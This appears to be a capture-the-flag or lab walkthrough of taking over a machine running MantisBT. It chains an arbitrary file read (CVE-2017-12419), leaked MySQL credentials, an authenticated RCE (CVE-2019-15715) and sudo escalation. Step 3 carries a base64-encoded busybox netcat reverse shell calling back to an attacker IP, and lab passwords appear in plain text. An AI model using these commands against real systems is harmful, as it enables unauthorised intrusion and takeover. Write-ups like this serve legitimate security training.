#box

*Created: 1/22/2026*

### Step 1

**Tags:** #Arbitrary-File-Read #MantisBT

**Command:**
```bash
php roguemysql.php 
Enter filename to get [/etc/passwd]: /var/www/html/bugtracker/config/config_inc.php
```

*Port: 80*

> 
> The machine exposes a website on port 80 that when fuzzed exposes a `/bugtracker` endpoint. We discover a Mantis BT instance and we try a few exploit after discovering it's actually vulnerable to Arbitrary File Read through [CVE-2017-12419](https://mantisbt.org/bugs/view.php?id=23173).
> 
> To make this CVE work we need to download [Rogue-MySql-Server](https://github.com/allyshka/Rogue-MySql-Server/tree/master) as mentioned in the CVE link. Once download we can run `php roguemysql.php` and specify the file that we want to read.
> Once specified, the script will hang since it'll wait for a connection on port 3306.
> The connection comes from a vulnerability in the `/admin/install.php` script of MantisBT when passing `install=3&hostname=ATTACKER_MACHINE`.
> Once sent this request we'll receive a connection with the content of the file.
> To proceed with the machine we can try look for the content inside `/var/www/html/bugtracker/config/config_inc.php` and retrieve the password of the user of the exposed instance of MariaDB on port 3306.

---

### Step 2

**Tags:** #Credentials-Leak

**Command:**
```bash
mysql -u root -pSuperSequelPassword -h 192.168.114.204 --skip-ssl
```

*Port: 3306*

> 
> Once read the content of the file inside `config_inc.php` we can authenticate to the SQL instance exposed on port 3306. Inside of it we cannot gain RCE because the vital functions to gain RCE are disabled but we get to find the `administrator`'s password of Mantis to authenticate to MantisBT: `administrator:prayingmantis`

---

### Step 3

**Tags:** #RCE #MantisBT #Reverse-Shell

**Command:**
```bash
python3 CVE-2019-15715.py -rh 192.168.114.204 -rp 80 -lh 192.168.45.193 -lp 3306 -u "administrator" -p "prayingmantis" -e "/bugtracker" -rs "YnVzeWJveCBuYyAxOTIuMTY4LjQ1LjE5MyAzMzA2IC1lIC9iaW4vc2g="
```

*Port: 80*

> 
> Once obtained the password for the MantisBT we can authenticate into it and leverage on [CVE-2019-15715](https://www.exploit-db.com/exploits/48818) to gain a reverse shell. To do so, the script downloaded will require some refinement to make it work properly and that's why I've created my own version of it: [CVE-2019-15715](https://github.com/mcornaglia/CVE-2019-15715)

---

### Step 4

**Tags:** #cron #Credentials-Leak

**Command:**
```bash
./pspy64
```

> 
> With a shell as `www-data` on the target machine, we realize a job is running every one minute with `pspy64`. This job manifests an user and a password. We find out that we can move laterally onto the only user having a shell on the machine, `mantis` with the same password discovered, suffering a Password Reuse vulnerability. It's required to keep `pspy64` for some minutes before having the cleartext password (doesn't work at every run for some reason)

---

### Step 5

**Tags:** #sudo-Privileges #sudo #GTFOBins

**Command:**
```bash
sudo su
```

> 
> Once authenticated as `mantis`, we realize with `sudo -l` that we can run any command as sudo, thus we escalate to root with `sudo su`

---

